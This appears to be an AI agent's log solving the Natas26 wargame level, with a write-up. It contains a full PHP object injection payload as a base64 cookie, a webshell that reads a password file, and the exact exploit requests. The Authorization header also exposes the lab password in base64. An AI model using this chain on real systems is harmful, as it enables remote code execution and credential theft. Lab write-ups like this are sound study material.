@@ -1,0 +1,60 @@
+=== session start: zai/glm-5.2 ===
+PROMPT: resolve the challenge and give me flag on http://natas26:????????????????????????@natas26.natas.labs.overthewire.org/ 
+I'll start by launching the browser and exploring the Natas26 challenge.
+  ↳ browser_launch {"headless": true}
+  ↳ browser_navigate {"url": "http://natas26:????????????????????????@natas26.natas.labs.overthewire.org/"}
+  ↳ browser_snapshot {}
+Let me look at the source code for this challenge.
+  ↳ browser_navigate {"url": "http://natas26:????????????????????????@natas26.natas.labs.overthewire.org/index-source.html"}
+  ↳ browser_snapshot {}
+  ↳ browser_evaluate_js {"expression": "document.body.innerText"}
+This is a classic PHP Object Injection vulnerability. The `drawing` cookie is passed to `unserialize()` with no validation. The `Logger` class has a `__destruct()` method that writes `$exitMsg` to `$logFile`. By injecting a crafted `Logger` object, I can write arbitrary PHP code to a web-accessible file.
+
+Let me build the serialized payload:
+  ↳ browser_evaluate_js {"expression": "\n// Build PHP Object Injection payload for Logger class\n// Private properties are serialized as \\0ClassName\\0propertyName\nconst logFile = \"img/x.php\";\nconst exitMsg = '<?php system(\"cat /etc/natas_webpass/natas27\"); ?>';\nconst initMsg = \"#--session started--#\\n\";\n\n// \\0Logger\\0logFile = 1 + 6 + 1 + 7 = 15 bytes\n// \\0Logger\\0initMsg = 15 bytes\n// \\0Logger\\0exitMsg = 15 bytes\n\nconst payload = 'O:6:\"Logger\":3:{' +\n  's:15:\"\\0Logger\\0logFile\";s:' + logFile.length + ':\"' + logFile + '\";' +\n  's:15:\"\\0Logger\\0initMsg\";s:' + initMsg.length + ':\"' + initMsg + '\";' +\n  's:15:\"\\0Logger\\0exitMsg\";s:' + exitMsg.length + ':\"' + exitMsg + '\";}';\n\n// Base64 encode it\nconst b64 = btoa(payload);\n\nJSON.stringify({ payload, b64, payloadLen: payload.length });\n"}
+The payload is ready. Now let me send it with valid GET params to trigger the `drawImage()` → `drawFromUserdata()` → `unserialize()` path:
+  ↳ http_request {"url": "http://natas26.natas.labs.overthewire.org/?x1=0&y1=0&x2=1&y2=1", "use_session": false, "headers": {"Authorization": "Basic bmF0YXMyNjozQ0FwZHBqcUk0VVlQeFk4bUhRV1VkRlBHSDlCb1VUVA=="}, "cookies": {"drawing": "Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo5OiJpbWcveC5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czoyMjoiIy0tc2Vzc2lvbiBzdGFydGVkLS0jCiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjUwOiI8P3BocCBzeXN0ZW0oImNhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNyIpOyA/PiI7fQ=="}}
+The error is expected — it occurs in `storeData()` after the unserialize, but the `__destruct()` fires at script end. The webshell should now be written. Let me access it:
+  ↳ http_request {"headers": {"Authorization": "Basic bmF0YXMyNjozQ0FwZHBqcUk0VVlQeFk4bUhRV1VkRlBHSDlCb1VUVA=="}, "url": "http://natas26.natas.labs.overthewire.org/img/x.php", "use_session": false}
+I got the password for the next level. Let me record it and close the browser.
+  ↳ export {"result": "natas27 password: ????????????????????????"}
+  ↳ browser_close {}
+## ✅ Challenge Solved — Flag Captured
+
+### Flag (natas27 password)
+```
+????????????????????????
+```
+
+---
+
+### Vulnerability: PHP Object Injection → Remote Code Execution
+**Severity: Critical**
+
+The `drawing` cookie is deserialized with `unserialize()` without any validation:
+```php
+$drawing = unserialize(base64_decode($_COOKIE["drawing"]));
+```
+
+The page also defines a `Logger` class with a `__destruct()` magic method that writes `$exitMsg` to `$logFile`. By crafting a serialized `Logger` object where:
+- `logFile` → `img/x.php` (a web-accessible path)
+- `exitMsg` → `<?php system("cat /etc/natas_webpass/natas27"); ?>`
+
+...and sending it as the `drawing` cookie (base64-encoded), the `__destruct()` fires at script shutdown and writes a PHP webshell into the document root.
+
+### Exploit request
+```
+GET /?x1=0&y1=0&x2=1&y2=1 HTTP/1.1
+Host: natas26.natas.labs.overthewire.org
+Cookie: drawing=Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo5OiJpbWcveC5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czoyMjoiIy0tc2Vzc2lvbiBzdGFydGVkLS0jCiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjUwOiI8P3BocCBzeXN0ZW0oImNhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNyIpOyA/PiI7fQ==
+```
+
+Then a simple `GET /img/x.php` executed the payload and returned the password.
+
+### Proof (response from `/img/x.php`)
+```
+????????????????????????
+```
+
+### Remediation
+**PHP:** Never pass untrusted user input to `unserialize()`. Replace it with a safe format like `json_decode()`. If unavoidable, use `unserialize($data, ['allowed_classes' => false])` (PHP 7+) to block arbitrary object instantiation.
